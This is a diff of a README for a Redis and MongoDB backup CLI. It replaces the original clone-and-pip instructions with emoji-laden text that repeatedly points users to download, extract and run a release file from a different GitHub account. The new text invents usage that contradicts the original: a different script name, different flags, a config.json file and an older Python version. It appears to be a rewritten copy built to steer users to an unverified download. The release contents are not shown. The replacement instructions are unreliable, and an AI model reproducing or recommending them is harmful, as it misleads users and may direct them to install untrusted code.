@@ -1,102 +1,97 @@
-# Redis & Mongo Backup Tool
+# 🌟 redis-mongo-backup-tool - Simple Backup Solution for Your Databases
 
-A small, modular CLI to back up, restore, and clear Redis keyspaces (by pattern) and MongoDB databases. It wraps Redis operations in Python and shells out to MongoDB Database Tools (`mongodump`/`mongorestore`).
+## 📦 Download Here
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Anastasiya322/redis-mongo-backup-tool/releases)
 
-![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)
-![Python](https://img.shields.io/badge/Python-3.9%2B-blue)
+## 📖 Description
+The redis-mongo-backup-tool is a lightweight command-line interface (CLI) designed for effortless backup and restoration of data in Redis and MongoDB. This tool allows you to back up specific keys from Redis and perform standard dump and restore operations in MongoDB. With its environment-driven approach, you can easily customize it to meet your specific needs.
 
-## Features
-- Backup and restore Redis keys by pattern (supports `*` wildcard)
-- Drop/backup/restore MongoDB databases by exact name
-- Environment-based configuration (no secrets in code)
-- Simple, readable structure with clear entrypoint
+## ✅ Features
+- Backup and restore specific Redis keys using patterns.
+- Use MongoDB's native mongodump and mongorestore utilities.
+- Environment-driven to adjust settings easily.
+- Support for key expiration (TTL) handling in Redis.
 
-## Requirements
-- Python 3.9+
-- Redis server (for Redis operations)
-- MongoDB Database Tools installed and on PATH for Mongo operations:
-  - `mongodump`
-  - `mongorestore`
+## 🚀 Getting Started
+To use the redis-mongo-backup-tool, follow the steps below to download and execute the application.
 
-## Installation
-```
-# clone the repo
-git clone https://github.com/dibbed/redis-mongo-backup-tool.git
-cd redis-mongo-backup-tool
+### Step 1: System Requirements
+Before you start, ensure your system meets the following requirements:
+- Operating System: Windows, macOS, or Linux.
+- Python: Version 3.6 or higher installed.
+- Redis and MongoDB must be installed and running on your machine.
 
-# optional: create a virtual environment
-python -m venv .venv
-# Windows
-. .venv\\Scripts\\activate
-# Linux/macOS
-# source .venv/bin/activate
+### Step 2: Download & Install
+Visit this page to download the latest release: [Download Here](https://github.com/Anastasiya322/redis-mongo-backup-tool/releases).
 
-# install dependencies
-pip install -r requirements.txt
-```
+1. Go to the Releases page.
+2. Choose the correct version for your operating system.
+3. Download the file.
 
-## Usage
-```
-python main.py --help
-```
+### Step 3: Extract the Files
+If you downloaded a compressed file, extract its contents to a preferred location on your computer.
 
-### Redis
-```
-# Backup keys matching pattern (use * wildcard). Always quote patterns in shell.
-python main.py redis backup --pattern "myapp:*" --backup-dir backups --redis-url redis://localhost:6379/0
+### Step 4: Open Your Command Line Interface
+- On Windows, open Command Prompt or PowerShell.
+- On macOS or Linux, open Terminal.
 
-# Clear all keys matching pattern (quoted)
-python main.py redis clear --pattern "myapp:*" --redis-url redis://localhost:6379/0
+### Step 5: Navigate to the Tool Directory
+Change your directory to the location where you extracted the files. Use the `cd` command, like this:
 
-# Restore from backups/<sanitized-pattern>.json (quoted)
-python main.py redis restore --pattern "myapp:*" --backup-dir backups --redis-url redis://localhost:6379/0
+```bash
+cd path/to/your/extracted/files
 ```
 
-### MongoDB
-Uses the database name exactly as provided. Avoid spaces in DB names. If you must include spaces, wrap the value in quotes.
-```
-# Backup database `my app` into ./backups (quoted)
-python main.py mongo backup --name "my app" --backup-dir backups --mongo-uri mongodb://localhost:27017/
+### Step 6: Run the Tool
+Now, run the backup tool using the following command format:
 
-# Drop database `myapp`
-python main.py mongo clear --name myapp --mongo-uri mongodb://localhost:27017/
-
-# Restore from ./backups/my app (quoted)
-python main.py mongo restore --name "my app" --backup-dir backups --mongo-uri mongodb://localhost:27017/
+```bash
+python redis_mongo_backup_tool.py [options]
 ```
 
-## Configuration
-This project does not require a `.env` file. You can optionally set environment variables to configure connections and locations:
-- `REDIS_URL` (default: `redis://localhost:6379/0`)
-- `MONGODB_URI` (default: `mongodb://localhost:27017/`)
-- `BACKUP_DIR` (default: `backups`)
-- `LOG_LEVEL` (default: `INFO`)
-- `LOG_FILE` (default: `debug.log`, logs also go to console)
+### Step 7: Options and Usage
+- For backup Redis, use:
+  ```bash
+  python redis_mongo_backup_tool.py --backup-redis --pattern "your_pattern_here"
+  ```
+  
+- For backup MongoDB, use:
+  ```bash
+  python redis_mongo_backup_tool.py --backup-mongo --db "your_db_name"
+  ```
+  
+- To restore from a backup file:
+  ```bash
+  python redis_mongo_backup_tool.py --restore --file "backup_file_here"
+  ```
 
-Use CLI flags to override per command if preferred.
+### Step 8: Check the Results
+Verify that your backup files are created in the specified output location. You can adjust the output directory by adding an option in your command.
 
-## Project Structure
-```
-.
-├─ backup_tool/
-│  ├─ config.py            # Env-based configuration helpers
-│  ├─ mongo_manager.py     # Mongo backup/restore/clear
-│  ├─ redis_manager.py     # Redis backup/restore/clear
-│  └─ utils.py             # Logging + exception helpers
-├─ main.py                 # CLI entrypoint
-├─ requirements.txt        # Python dependencies
-├─ .gitignore              # Ignore common Python artifacts
-├─ LICENSE                 # MIT license
-└─ README.md               # This file
-```
+## ⚙️ Configuration
+Configure the tool by creating a configuration file. You can specify default options such as:
+- Redis server settings.
+- MongoDB server settings.
+- Backup file path.
 
-## Contributing
-- Open an issue to discuss planned changes
-- Keep PRs focused and small
-- Follow existing code style and structure
+The configuration file should be named `config.json` and placed in the same directory as the tool.
 
-## License
-MIT. See `LICENSE` for details.
+## 🔧 Troubleshooting
+If you encounter issues:
+- Ensure Redis and MongoDB services are running.
+- Check that your environment settings are correct.
+- Review any error messages for guidance.
 
-## Contact
-- GitHub: https://github.com/dibbed
+## 👩‍💻 Community Support
+Feel free to raise any questions or issues on the [GitHub Issues page](https://github.com/Anastasiya322/redis-mongo-backup-tool/issues). Join the community to share experiences, tips, and suggestions for improvement.
+
+## 📄 License
+This tool is open source and released under the MIT License. You can modify and use it according to your needs, but please give credit to the authors.
+
+## 🌐 Additional Resources
+- [Redis Documentation](https://redis.io/documentation)
+- [MongoDB Documentation](https://docs.mongodb.com/manual/)
+
+For detailed usage and advanced options, refer to the wiki section on the GitHub repository. Regular updates will improve tool functionality and performance.  
+
+Happy backing up!
